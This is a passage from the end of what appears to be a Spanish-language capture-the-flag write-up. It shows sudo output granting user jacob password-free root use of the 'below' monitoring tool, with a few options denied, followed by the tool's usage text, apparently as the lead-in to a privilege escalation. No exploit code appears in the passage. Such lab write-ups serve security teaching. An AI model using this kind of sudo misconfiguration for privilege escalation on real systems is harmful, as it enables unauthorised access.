+<span class="line"><span style="color:#B392F0">    env_reset,</span><span style="color:#9ECBFF"> mail_badpass,</span><span style="color:#9ECBFF"> secure_path=/usr/local/sbin</span><span style="color:#79B8FF">\:</span><span style="color:#9ECBFF">/usr/local/bin</span><span style="color:#79B8FF">\:</span><span style="color:#9ECBFF">/usr/sbin</span><span style="color:#79B8FF">\:</span><span style="color:#9ECBFF">/usr/bin</span><span style="color:#79B8FF">\:</span><span style="color:#9ECBFF">/sbin</span><span style="color:#79B8FF">\:</span><span style="color:#9ECBFF">/bin</span><span style="color:#79B8FF">\:</span><span style="color:#9ECBFF">/snap/bin,</span><span style="color:#9ECBFF"> use_pty</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">User</span><span style="color:#9ECBFF"> jacob</span><span style="color:#9ECBFF"> may</span><span style="color:#9ECBFF"> run</span><span style="color:#9ECBFF"> the</span><span style="color:#9ECBFF"> following</span><span style="color:#9ECBFF"> commands</span><span style="color:#9ECBFF"> on</span><span style="color:#9ECBFF"> outbound:</span></span>
+<span class="line"><span style="color:#E1E4E8">    (</span><span style="color:#B392F0">ALL</span><span style="color:#9ECBFF"> :</span><span style="color:#9ECBFF"> ALL</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">NOPASSWD:</span><span style="color:#9ECBFF"> /usr/bin/below</span><span style="color:#79B8FF"> *</span><span style="color:#9ECBFF">,</span><span style="color:#9ECBFF"> !/usr/bin/below</span><span style="color:#79B8FF"> --config</span><span style="color:#F97583">*</span><span style="color:#79B8FF">,</span><span style="color:#9ECBFF"> !/usr/bin/below</span><span style="color:#79B8FF"> --debug</span><span style="color:#F97583">*</span><span style="color:#79B8FF">,</span><span style="color:#9ECBFF"> !/usr/bin/below</span><span style="color:#79B8FF"> -d</span><span style="color:#F97583">*</span></span>
+<span class="line"><span style="color:#B392F0">jacob@outbound:~$</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">Usage:</span><span style="color:#9ECBFF"> below</span><span style="color:#E1E4E8"> [OPTIONS] [COMMAND]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">Commands:</span></span>
+<span class="line"><span style="color:#B392F0">  live</span><span style="color:#9ECBFF">      Display</span><span style="color:#9ECBFF"> live</span><span style="color:#9ECBFF"> system</span><span style="color:#9ECBFF"> data</span><span style="color:#E1E4E8"> (interactive) (</span><span style="color:#B392F0">default</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">  record</span><span style="color:#9ECBFF">    Record</span><span style="color:#9ECBFF"> local</span><span style="color:#9ECBFF"> system</span><span style="color:#9ECBFF"> data</span><span style="color:#E1E4E8"> (daemon </span><span style="color:#9ECBFF">mode</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">  replay</span><span style="color:#9ECBFF">    Replay</span><span style="color:#9ECBFF"> historical</span><span style="color:#9ECBFF"> data</span><span style="color:#E1E4E8"> (interactive)</span></span>
+<span class="line"><span style="color:#B392F0">  debug</span><span style="color:#9ECBFF">     Debugging</span><span style="color:#9ECBFF"> facilities</span><span style="color:#E1E4E8"> (for </span><span style="color:#9ECBFF">development</span><span style="color:#9ECBFF"> use</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">  dump</span><span style="color:#9ECBFF">      Dump</span><span style="color:#9ECBFF"> historical</span><span style="color:#9ECBFF"> data</span><span style="color:#9ECBFF"> into</span><span style="color:#9ECBFF"> parseable</span><span style="color:#9ECBFF"> text</span><span style="color:#9ECBFF"> format</span></span>
+<span class="line"><span style="color:#B392F0">  snapshot</span><span style="color:#9ECBFF">  Create</span><span style="color:#9ECBFF"> a</span><span style="color:#9ECBFF"> historical</span><span style="color:#9ECBFF"> snapshot</span><span style="color:#9ECBFF"> file</span><span style="color:#9ECBFF"> for</span><span style="color:#9ECBFF"> a</span><span style="color:#9ECBFF"> given</span><span style="color:#9ECBFF"> time</span><span style="color:#9ECBFF"> range</span></span>
+<span class="line"><span style="color:#B392F0">  help</span><span style="color:#9ECBFF">      Print</span><span style="color:#9ECBFF"> this</span><span style="color:#9ECBFF"> message</span><span style="color:#9ECBFF"> or</span><span style="color:#9ECBFF"> the</span><span style="color:#9ECBFF"> help</span><span style="color:#9ECBFF"> of</span><span style="color:#9ECBFF"> the</span><span style="color:#9ECBFF"> given</span><span style="color:#9ECBFF"> subcommand</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">s</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">Options:</span></span>
+<span class="line"><span style="color:#B392F0">      --config</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">CONFI</span><span style="color:#E1E4E8">G</span><span style="color:#F97583">></span><span style="color:#E1E4E8">  [default: </span><span style="color:#9ECBFF">/etc/below/below.conf]</span></span>
+<span class="line"><span style="color:#B392F0">  -d,</span><span style="color:#79B8FF"> --debug</span><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#B392F0">  -h,</span><span style="color:#79B8FF"> --help</span><span style="color:#9ECBFF">             Print</span><span style="color:#9ECBFF"> help</span></span>
+<span class="line"></span>
+<span class="line"></span></code></pre> </div> <!-- Footer del artículo --> <div class="mt-16 pt-8 border-t border-slate-800"> <a href="/writeups" class="text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a la lista de writeups
+</a> </div> </article>   </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
+© 2025 Angel C. Corral — Ciberseguridad
+</div> </footer> </div> </body></html>
